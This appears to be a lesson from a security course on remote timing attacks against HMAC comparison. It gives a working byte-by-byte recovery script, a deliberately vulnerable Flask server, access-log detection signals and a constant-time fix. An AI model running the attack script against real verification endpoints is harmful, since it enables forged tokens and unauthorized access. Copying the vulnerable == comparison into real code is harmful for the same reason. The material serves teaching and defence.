---
title: "Timing Attacks — Side-Channel via Response Time"
tags: [cryptography, timing-attack, side-channel, constant-time, HMAC,
  CWE-208, T1600, timing-oracle, hmac-comparison, remote-timing]
module: 09-Crypto-01
day: 563
prerequisites:
  - Day 561 — Padding Oracle Attack
  - Day 031 — MACs, HMACs and Forgery Lab
related_topics:
  - Padding Oracle Attack (Day 561)
  - Length Extension Attack (Day 564)
  - Timing Oracle vs Padding Oracle
---

# Day 563 — Timing Attacks

> "You do not need the server to tell you yes or no. Sometimes it tells you
> by how long it thinks before answering. Microseconds become bits. Bits become
> keys. This is why 'secure' comparison functions exist — and why most code
> does not use them."
>
> — Ghost

---

## Goals

- Understand why early-exit string comparison leaks information through timing.
- Implement a remote timing attack against an HMAC comparison that uses `==`.
- Measure the statistical requirements for a successful remote timing attack.
- Implement and verify constant-time comparison as the fix.

**Prerequisites:** Day 031 (HMACs), Day 561 (oracle concept).
**Estimated study time:** 3 hours.

---

## 1. Recon — The Leaking Comparison

### How `==` Works on Most Platforms

Most string/bytes comparisons return `False` as soon as the first differing
byte is found:

```python
def naive_equals(a: bytes, b: bytes) -> bool:
    if len(a) != len(b):
        return False
    for i in range(len(a)):
        if a[i] != b[i]:
            return False   # ← returns early on first mismatch
    return True
```

**The leak:** if the first byte matches, the loop runs one iteration longer
than if it does not match. Correct first byte → longer execution time.

For a 32-byte HMAC-SHA256:
- 0 correct bytes → exits after ≈ 1 comparison
- 1 correct byte  → exits after ≈ 2 comparisons
- 31 correct bytes → exits after ≈ 32 comparisons

In theory: 32 × 256 = **8,192 total guesses** to recover the full HMAC.

### The Remote Challenge

In practice, network jitter dwarfs the comparison time difference.
A single comparison on modern hardware takes ≈ 1–10 ns.
Network round-trip time (RTT) is ≈ 1–100 ms — **6 orders of magnitude larger**.

**Solution:** measure each byte guess many times (typically 100–1,000 requests)
and use the **median or minimum** to filter out network jitter.

This technique was demonstrated in:
- Crosby et al., "Opportunities and Limits of Remote Timing Attacks" (2009)
- Lucky Thirteen attack (2013) — timing oracle in TLS MAC verification

---

## 2. The Attack — Statistical Byte Recovery

### Algorithm

```
For each byte position i (0 to len(mac) - 1):
  For each candidate byte value g (0x00 to 0xFF):
    Send N requests with prefix = correct[:i] + [g] + random_suffix
    Record response times t₁, t₂, … tₙ
    stat[g] = min(t₁, t₂, … tₙ)   # minimum filters out slow outliers
  correct[i] = argmax(stat)         # byte with highest min time = most comparisons
```

### Minimal Implementation

```python
#!/usr/bin/env python3
"""
timing_attack.py — remote timing attack against HMAC comparison
"""
from __future__ import annotations

import os
import time
import statistics
import hmac
import hashlib
import requests

TARGET = "http://localhost:9090/verify"
N_SAMPLES = 150  # requests per candidate byte — increase for noisy networks

def measure_time(mac_guess: bytes) -> float:
    """Return round-trip time for a single verification request."""
    import base64
    token = base64.urlsafe_b64encode(mac_guess).decode()
    start = time.perf_counter()
    requests.get(TARGET, params={"mac": token}, timeout=2)
    end = time.perf_counter()
    return end - start

def attack_byte(known_prefix: bytes, mac_len: int = 32) -> bytes:
    """Recover one byte of the MAC by timing."""
    best_time = -1.0
    best_byte = 0

    for guess in range(256):
        candidate = known_prefix + bytes([guess]) + os.urandom(
            mac_len - len(known_prefix) - 1
        )
        # Collect N_SAMPLES measurements and take the minimum
        times = [measure_time(candidate) for _ in range(N_SAMPLES)]
        t_min = min(times)

        if t_min > best_time:
            best_time = t_min
            best_byte = guess

        if guess % 32 == 0:
            print(f"  [{len(known_prefix):02d}] candidate 0x{guess:02x} "
                  f"min={t_min*1000:.3f}ms best=0x{best_byte:02x}")

    return known_prefix + bytes([best_byte])

def recover_mac(mac_len: int = 32) -> bytes:
    known = b""
    for i in range(mac_len):
        print(f"\n[*] Recovering byte {i+1}/{mac_len}…")
        known = attack_byte(known, mac_len)
        print(f"[+] Known so far: {known.hex()}")
    return known

if __name__ == "__main__":
    print("[*] Starting timing attack against HMAC comparison…")
    recovered_mac = recover_mac(mac_len=32)
    print(f"\n[+] Recovered HMAC: {recovered_mac.hex()}")
```

### Vulnerable Server

```python
# timing_server.py — the vulnerable application
from __future__ import annotations

import hmac
import hashlib
import os
import base64
from flask import Flask, request, jsonify

app = Flask(__name__)
SECRET_KEY = os.urandom(32)
MESSAGE = b"admin:1704067200"

# Pre-compute the correct MAC
CORRECT_MAC = hmac.new(SECRET_KEY, MESSAGE, hashlib.sha256).digest()

@app.route('/verify')
def verify():
    try:
        mac_b64 = request.args.get('mac', '')
        submitted_mac = base64.urlsafe_b64decode(mac_b64)
    except Exception:
        return jsonify({"valid": False}), 400

    # VULNERABLE: naive byte comparison — early exit on first mismatch
    if submitted_mac == CORRECT_MAC:   # Python bytes == is NOT constant-time
        return jsonify({"valid": True, "token": "admin_access_granted"})
    return jsonify({"valid": False}), 403

if __name__ == '__main__':
    # Add artificial delay to make timing difference measurable
    # (production systems have more jitter — need more samples)
    app.run(host='0.0.0.0', port=9090, threaded=False)  # single-threaded!
```

---

## 3. The Limits of Remote Timing

### When Does Remote Timing Work?

| Condition | Feasibility |
|---|---|
| LAN (< 1 ms RTT) | High — 50–100 samples sufficient |
| Same datacenter (< 5 ms RTT) | Medium — 200–500 samples |
| Internet (> 50 ms RTT) | Low — needs 1,000+ samples + statistical filtering |
| Cloud co-residency (co-tenant on same hypervisor) | High — shared CPU cache effects |

### Statistical Filtering Techniques

- **Minimum:** filters out slow outliers (network congestion, GC pauses)
- **Trimmed mean:** discard top/bottom 10%, average the rest
- **t-test / Mann-Whitney U:** compare distributions between candidate bytes

Practical rule: for an operation taking < 100 ns on a remote host with > 10 ms
RTT, you need ≥ 1,000 samples per byte and ≥ 3 statistical methods to be
confident.

---

## 4. Detect

### What Timing Attacks Look Like

```
# Access log — timing attack in progress:
# Same endpoint, sequential requests, incrementally different parameters

10.0.0.5 - - [01/Jan/2024:10:00:00] "GET /verify?mac=AAAAAAAAAA..." 403
10.0.0.5 - - [01/Jan/2024:10:00:00] "GET /verify?mac=AAAAAAAAAB..." 403
10.0.0.5 - - [01/Jan/2024:10:00:00] "GET /verify?mac=AAAAAAAAAC..." 403
...
# 150+ requests per second, same endpoint, only last parameter byte changes
# After ~150 requests, the first byte "stabilises" and the second byte starts
# changing — tells the defender which byte position is being brute-forced
```

### Detection Signal

- Volume: high request rate (> 100 req/s) to a MAC/token verification endpoint
- Pattern: parameter differs by exactly 1 byte per batch of N requests
- Signature: base64-encoded parameters that are all the same length

---

## 5. Harden — Constant-Time Comparison

### The Fix

```python
# GOOD: use hmac.compare_digest (constant-time, built into Python stdlib)
import hmac

def verify_mac_secure(submitted: bytes, correct: bytes) -> bool:
    """
    Compare two MAC values in constant time.
    hmac.compare_digest runs in O(n) regardless of where the first mismatch is.
    Returns False on length mismatch too (also constant-time for same length).
    """
    return hmac.compare_digest(submitted, correct)

# ── What hmac.compare_digest actually does internally: ─────────────────────
def constant_time_compare(a: bytes, b: bytes) -> bool:
    """
    Manual constant-time bytes comparison.
    XOR each byte pair and OR the results — never short-circuits.
    """
    if len(a) != len(b):
        return False
    result = 0
    for x, y in zip(a, b):
        result |= x ^ y  # accumulates differences without branching
    return result == 0
```

### Why `hmac.compare_digest` Is the Right Tool

```
Python's ==  operator for bytes:
  Implemented as memcmp() in CPython, which may short-circuit on first mismatch.
  Timing difference is measurable even locally.

hmac.compare_digest:
  Uses an algorithm equivalent to XOR-and-OR across all bytes.
  Runs in O(n) time regardless of where the first mismatch occurs.
  Specified in Python docs as "constant time" for cryptographic use.

Other languages:
  Java:   MessageDigest.isEqual() — constant time
  Go:     subtle.ConstantTimeCompare() from crypto/subtle
  C:      CRYPTO_memcmp() from OpenSSL / sodium_memcmp() from libsodium
  Ruby:   Rack::Utils.secure_compare()
```

### Fixed Server

```python
@app.route('/verify')
def verify():
    try:
        submitted_mac = base64.urlsafe_b64decode(request.args.get('mac', ''))
    except Exception:
        return jsonify({"valid": False}), 400

    # FIXED: constant-time comparison — no timing oracle
    if hmac.compare_digest(submitted_mac, CORRECT_MAC):
        return jsonify({"valid": True, "token": "admin_access_granted"})
    return jsonify({"valid": False}), 403
```

---

## Real-World Cases

| Attack | Year | Target | Oracle type |
|---|---|---|---|
| Lucky Thirteen | 2013 | TLS 1.2 HMAC verification | 13-byte timing difference in MAC padding |
| Django HMAC comparison | 2014 | Django session tokens | `==` on HMAC strings (CVE-2014-0473) |
| Ruby on Rails | 2013 | HMAC-based CSRF tokens | `==` on string comparison |
| Mailchimp API key | 2012 | API key verification | Response time leaked key prefix matches |

**Lucky Thirteen (CVE-2013-0169):** Required ≈ 2²³ queries per byte. Practically
infeasible for remote Internet exploitation but feasible in local network or
co-tenancy scenarios. Patched in all major TLS libraries by switching MAC
verification to constant-time operations.

---

## Key Takeaways

1. The word "secure" in a comparison function name is not decoration. `hmac.compare_digest`
   exists specifically because `==` on bytes is not cryptographically safe.
   Every MAC and HMAC verification in production code must use constant-time
   comparison.
2. Remote timing attacks are harder than local ones but not impossible. The
   threshold for practical exploitation depends on RTT, jitter, and the size
   of the timing difference. Co-residency attacks (cloud, shared hosting) are
   closer to local — RTT is measured in microseconds.
3. The detection signal (high volume, incrementally varying parameter) is
   distinct. Rate limiting on verification endpoints also raises the cost of
   the attack dramatically — even a 10ms artificial delay makes Internet-level
   timing attacks statistically infeasible.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q563.1, Q563.2 …).

---

## Navigation

← Previous: [Day 562 — Padding Oracle Lab](DAY-0562-Padding-Oracle-Lab.md)
→ Next: [Day 564 — Length Extension Attack](DAY-0564-Length-Extension-Attack.md)
